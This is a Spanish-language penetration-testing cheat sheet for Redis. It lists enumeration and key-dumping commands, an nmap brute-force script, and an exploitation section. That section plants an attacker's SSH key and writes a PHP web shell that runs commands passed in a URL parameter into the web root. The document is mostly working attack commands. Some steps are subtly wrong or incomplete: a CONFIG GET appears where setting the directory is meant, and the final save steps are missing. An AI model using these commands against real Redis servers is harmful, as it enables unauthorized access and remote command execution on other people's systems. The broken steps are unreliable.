# REDIS

## Enumeración
### Canales activos
```nmap
nmap -p PORT --script redis-info IP
```
## Interacción con el servicio
### Conexión mediante redis-cli
```bash
redis-cli -h IP
```
### Obtener versión desde un servicio redis
```redis
INFO
```
#### Obtener los nombres de las keys desde un servicio redis
```redis
KEYS *
```
#### Listar todos los items bajo una key desde el servicio redis
```
LRANGE KEYNAME 0 -1
```
```
SMEMBERS KEYNAME
```
```
HGETALL KEYNAME
```
#### Autenticarse en el servico redis
```
AUTH username
```
#### Obtener directorio del usuario redis
```
CONFIG GET dir
```
## Ataque por fuerza bruta
### Nmap Script
```nmap
nmap -p PORT --script redis-brute IP
```
## Exploiting
### Add ssh key
* 1. Obtener el directorio de redis
```
CONFIG GET dir
```
* 2. Comprueba si tienes acceso al .ssh de el usuario redis
```
CONFIG GET /redis/dir/.ssh
```
* 3. Pasamos nuestra clave a esa carpeta
```
cat rsa_key | redis-cli -h IP -x set ssh_key
```
### Web Shell
* 1. Obtener/guessear la ruta del directorio de la web y configurarlo como directorio de redis
```
config set dir /var/www/html
```
* 2. 
```
config set dbfilename redis.php
```
* 3. Subir la shell
```
set test " <?php system($_GET['cmd']); ?> "
```
